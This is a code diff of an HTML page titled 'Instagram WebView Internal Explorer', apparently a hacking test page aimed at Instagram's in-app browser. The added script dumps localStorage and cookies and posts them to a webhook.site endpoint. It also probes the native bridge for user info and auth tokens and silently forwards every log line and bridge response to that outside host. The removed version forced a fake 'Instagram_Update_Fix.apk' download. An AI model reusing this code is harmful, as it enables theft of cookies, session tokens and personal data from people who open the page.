@@ -1,35 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <title>Instagram WebView Internal Explorer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Download Lab</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 15px; }
+        .box { border: 1px solid #333; padding: 10px; background: #111; margin-bottom: 10px; border-radius: 5px; }
+        h3 { color: #f00; margin-top: 0; font-size: 14px; }
+        button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; width: 100%; cursor: pointer; margin-top: 5px; }
+        #console { background: #050505; color: #7ee787; padding: 10px; font-size: 11px; height: 150px; overflow-y: scroll; border: 1px solid #222; }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+<body>
 
-    <h3>Meta Resource Hijack Lab</h3>
-    <button onclick="triggerAutoDownload()" style="padding:15px; width:100%;">Test Auto-Download</button>
-    
-    <div id="status" style="margin-top:20px;">Waiting for trigger...</div>
+    <div class="box">
+        <h3>1. Storage & Cookie Leak</h3>
+        <button onclick="dumpStorage()">Dump LocalStorage & Cookies</button>
+    </div>
+
+    <div class="box">
+        <h3>2. Native Bridge Fuzzing</h3>
+        <button onclick="fuzzBridge('get_user_info')">Leak User Info</button>
+        <button onclick="fuzzBridge('get_auth_token')">Leak Auth Token</button>
+    </div>
+
+    <div class="box">
+        <h3>3. Intent Bypass Test</h3>
+        <button onclick="location.href='tel:*#06#'">Dialer IMEI Check</button>
+    </div>
+
+    <div id="console">> Initializing Explorer...<br>> Found Bridges: iabjs_unified_bridge</div>
 
     <script>
-        const WEBHOOK = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d";
+        const webhook = "https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3";
 
-        function triggerAutoDownload() {
-            document.getElementById('status').innerText = "Attempting Download...";
-            
-            // Ek fake "Security Update" file create karna
-            const blob = new Blob(["META_SECURITY_TEST_EXPLOIT"], {type: "application/octet-stream"});
-            const url = window.URL.createObjectURL(blob);
-            
-            const a = document.createElement("a");
-            a.href = url;
-            a.download = "Instagram_Update_Fix.apk"; // APK extension to check if blocked
-            document.body.appendChild(a);
-            a.click();
-            
-            // Webhook update
-            fetch(WEBHOOK + "?download_triggered=true");
+        function log(msg) {
+            const con = document.getElementById('console');
+            con.innerHTML += "<br>> " + msg;
+            con.scrollTop = con.scrollHeight;
+            // Silent exfiltration
+            fetch(webhook + "?log=" + btoa(msg));
         }
+
+        // IMPACT: Dumping exposed storage objects
+        async function dumpStorage() {
+            log("Dumping exposed storage objects...");
+            
+            // Testing LocalStorage
+            let lsData = JSON.stringify(localStorage);
+            log("LocalStorage: " + (lsData.length > 2 ? "Captured" : "Empty"));
+
+            // Testing CookieStore (Jo tune list mein dekha)
+            if (window.cookieStore) {
+                try {
+                    const cookies = await cookieStore.getAll();
+                    log("CookieStore: Found " + cookies.length + " cookies.");
+                    fetch(webhook, { method: 'POST', body: JSON.stringify({type: "cookie_leak", data: cookies}) });
+                } catch(e) { log("CookieStore access denied."); }
+            }
+        }
+
+        // IMPACT: Fuzzing the native bridge
+        function fuzzBridge(action) {
+            if (window.iabjs_unified_bridge) {
+                log("Fuzzing Bridge with action: " + action);
+                const payload = {"action": action, "timestamp": Date.now()};
+                window.iabjs_unified_bridge.postMessage(JSON.stringify(payload));
+                log("Payload sent. Check Webhook/Console for response.");
+            } else {
+                log("Bridge not found!");
+            }
+        }
+
+        // Listening for native responses
+        window.addEventListener("message", function(event) {
+            log("RESPONSE RECEIVED: " + JSON.stringify(event.data));
+            fetch(webhook + "?bridge_response=" + btoa(JSON.stringify(event.data)));
+        });
     </script>
 </body>
 </html>
